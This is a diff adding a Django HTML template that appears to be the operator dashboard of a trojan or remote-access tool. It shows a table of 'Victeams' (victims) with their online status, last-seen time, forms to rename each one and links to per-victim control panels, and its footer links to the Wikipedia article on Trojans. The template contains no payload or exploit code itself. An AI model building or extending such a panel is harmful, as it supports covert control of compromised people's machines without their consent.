@@ -1,0 +1,113 @@
+{% extends "main.html"%}
+
+{% load check_last_online%}
+
+{% block title%} {{title}} {%endblock title%}
+{%block body%} 
+
+{% include "nav.html" %}
+
+
+<div class="container">
+
+<style>
+  table {
+    width: 80%;
+    margin: 20px auto;
+    border: 2px solid white; /* قاب دور جدول */
+    border-collapse: collapse;
+    font-family: Arial, sans-serif;
+    background-color: #1c1422ff; /* پس‌زمینه تیره برای دیده شدن خط سفید */
+    color: white; /* متن سفید */
+  }
+  caption {
+    font-weight: bold;
+    margin-bottom: 10px;
+    font-size: 18px;
+    color: white;
+  }
+  th, td {
+    border: 1px solid white; /* خط سفید بین خانه‌ها */
+    padding: 8px 12px;
+    text-align: center;
+  }
+  thead {
+    background-color: #2e0000ff;
+  }
+  tfoot {
+    background-color: #240202bd;
+    font-style: italic;
+  }
+  a {
+    color: white;
+  }
+</style>
+
+
+<table>
+  <caption style="caption-side:top ; text-align:left;">Victeams</caption>
+
+  <thead>
+    <tr>
+      <th>Name</th>
+      <th>Up Status</th>
+      <th>Last online</th>
+      <th>Change Name</th>
+    </tr>
+  </thead>
+
+  <tbody>
+    {% for target in targets%}
+    <tr>
+      <td><a href="/panel/{{target.username}}">{{target.name}}</a></td>
+      {% if target.last_online|checkonline %}
+      <td style="color:green;">online</td>
+      {% else %}
+      <td style="color:red;">offline</td>
+      {% endif %}
+
+      <td>{{target.last_online|ctime}}</td>
+      <td>
+
+      <div id="newname{{target.username}}" style="display:none;">
+
+        <form method="POST">
+          {% csrf_token %}
+          <input type="hidden" name="uname" value="{{target.username}}">
+          <div class="d-flex
+          ">
+            <input type="text" name="newname" placeholder="Enter your name...">
+            <input type="submit" class="btn btn-black text-white border border-white shadow-none" value="Save">
+          </div>
+        </form>
+
+      </div>
+
+      <div id="iconnewname{{target.username}}">
+      <button onclick="document.getElementById('newname{{target.username}}').style.display = 'block';document.getElementById('iconnewname{{target.username}}').style.display = 'none';" class="btn btn-black text-white">
+        <svg xmlns="http://www.w3.org/2000/svg" width="30" height="25" fill="currentColor"  class="bi bi-pencil-square" viewBox="0 0 16 16">
+             <path  d="M15.502 1.94a.5.5 0 0 1 0 .706L14.459 3.69l-2-2L13.502.646a.5.5 0 0 1 .707 0l1.293 1.293zm-1.75 2.456-2-2L4.939 9.21a.5.5 0 0 0-.121.196l-.805 2.414a.25.25 0 0 0 .316.316l2.414-.805a.5.5 0 0 0 .196-.12l6.813-6.814z"/>
+            <path fill-rule="evenodd" d="M1 13.5A1.5 1.5 0 0 0 2.5 15h11a1.5 1.5 0 0 0 1.5-1.5v-6a.5.5 0 0 0-1 0v6a.5.5 0 0 1-.5.5h-11a.5.5 0 0 1-.5-.5v-11a.5.5 0 0 1 .5-.5H9a.5.5 0 0 0 0-1H2.5A1.5 1.5 0 0 0 1 2.5z"/>
+          </svg>   
+      </button>
+    </div>
+
+      </td>
+    </tr>
+  {%endfor%}
+
+  <tfoot>
+    <tr>
+      <th colspan="5">
+        <a href="https://en.wikipedia.org/wiki/Trojan" target="_blank">
+          By Scandb
+        </a>
+      </th>
+    </tr>
+  </tfoot>
+  
+</table>
+
+</div>
+
+{% endblock body %}
